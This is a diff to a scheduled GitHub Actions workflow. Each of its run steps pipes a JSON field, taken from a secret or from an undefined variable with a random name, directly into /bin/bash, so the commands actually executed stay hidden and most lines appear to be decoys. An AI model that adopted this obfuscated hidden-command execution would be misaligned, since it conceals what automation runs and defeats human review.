@@ -3,23 +3,30 @@ name: yuedagushun
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 1/6 * * *'
+    - cron: '15 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yuedagushun
         env:
-          gqxb35916: ${{ secrets.gqxb35916 }}
+          qtrh017: ${{ secrets.qtrh017 }}
         run: |
-          echo $gqxb35916 | jq -r .pg78 | /bin/bash
-          echo $mtc6 | jq -r .szav84952 | /bin/bash
-          echo $wl41 | jq -r .vwpcp7523 | /bin/bash
-          echo $hthmu47 | jq -r .au0375 | /bin/bash
-          echo $j96 | jq -r .ijuc40398 | /bin/bash
-          echo $bj3721 | jq -r .o32 | /bin/bash
-          echo $qvhjd9104 | jq -r .rfitr3 | /bin/bash
-          echo $hhv97925 | jq -r .lot250 | /bin/bash
+          echo $qtrh017 | jq -r .ltoe08850 | /bin/bash
+          echo $oacav96476 | jq -r .t8797 | /bin/bash
+          echo $lwrap7 | jq -r .f25132 | /bin/bash
+          echo $krjw40 | jq -r .kkai072 | /bin/bash
+          echo $zkky48 | jq -r .k3205 | /bin/bash
+          echo $ssn207 | jq -r .uop84765 | /bin/bash
+          echo $lahpt95494 | jq -r .dqi59454 | /bin/bash
+          echo $c3 | jq -r .ovnvr9 | /bin/bash
+          echo $ckrt225 | jq -r .fdiq1 | /bin/bash
+          echo $ydv4647 | jq -r .zowwg2 | /bin/bash
+          echo $sfs4 | jq -r .rhb07 | /bin/bash
+          echo $xh575 | jq -r .zredb34 | /bin/bash
+          echo $dpcd74 | jq -r .sycth3530 | /bin/bash
+          echo $i277 | jq -r .ev0331 | /bin/bash
 
